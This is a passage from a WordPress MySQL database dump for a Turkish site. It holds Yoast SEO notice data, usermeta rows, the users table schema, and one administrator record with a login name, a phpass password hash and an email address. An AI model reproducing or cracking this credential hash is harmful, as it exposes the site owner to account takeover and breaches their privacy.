<a class=\"button\" href=\"https://www.ismido.com.tr/wp-admin/?page=wpseo_dashboard&yoast_dismiss=upsell\">Please don\'t show me this notification anymore</a>\";s:7:\"options\";a:8:{s:4:\"type\";s:7:\"warning\";s:2:\"id\";s:19:\"wpseo-upsell-notice\";s:5:\"nonce\";N;s:8:\"priority\";d:0.80000000000000004;s:9:\"data_json\";a:0:{}s:13:\"dismissal_key\";N;s:12:\"capabilities\";s:14:\"manage_options\";s:16:\"capability_check\";s:3:\"all\";}}i:1;a:2:{s:7:\"message\";s:168:\"Don\'t miss your crawl errors: <a href=\"https://www.ismido.com.tr/wp-admin/admin.php?page=wpseo_search_console&tab=settings\">connect with Google Search Console here</a>.\";s:7:\"options\";a:8:{s:4:\"type\";s:7:\"warning\";s:2:\"id\";s:17:\"wpseo-dismiss-gsc\";s:5:\"nonce\";N;s:8:\"priority\";d:0.5;s:9:\"data_json\";a:0:{}s:13:\"dismissal_key\";N;s:12:\"capabilities\";s:14:\"manage_options\";s:16:\"capability_check\";s:3:\"all\";}}}");
INSERT INTO `cmrfu_usermeta` VALUES("70","1","last_login_time","2017-03-11 09:46:48");
INSERT INTO `cmrfu_usermeta` VALUES("79","1","locale","");
INSERT INTO `cmrfu_usermeta` VALUES("76","1","wpseo_excludeauthorsitemap","");
INSERT INTO `cmrfu_usermeta` VALUES("77","1","wpseo_content_analysis_disable","");
INSERT INTO `cmrfu_usermeta` VALUES("78","1","wpseo_keyword_analysis_disable","");


DROP TABLE IF EXISTS `cmrfu_users`;

CREATE TABLE `cmrfu_users` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_login` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_pass` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_nicename` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_url` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_registered` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `user_activation_key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_status` int(11) NOT NULL DEFAULT '0',
  `display_name` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`ID`),
  KEY `user_login_key` (`user_login`),
  KEY `user_nicename` (`user_nicename`),
  KEY `user_email` (`user_email`)
) ENGINE=MyISAM AUTO_INCREMENT=8725 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_users` VALUES("1","ismido123","$P$Bz2dW9v9vknJ68XO4lbqdh8soJmyci.","ismido","info@ismido.com.tr","","2014-02-17 11:08:26","","0","ismido");


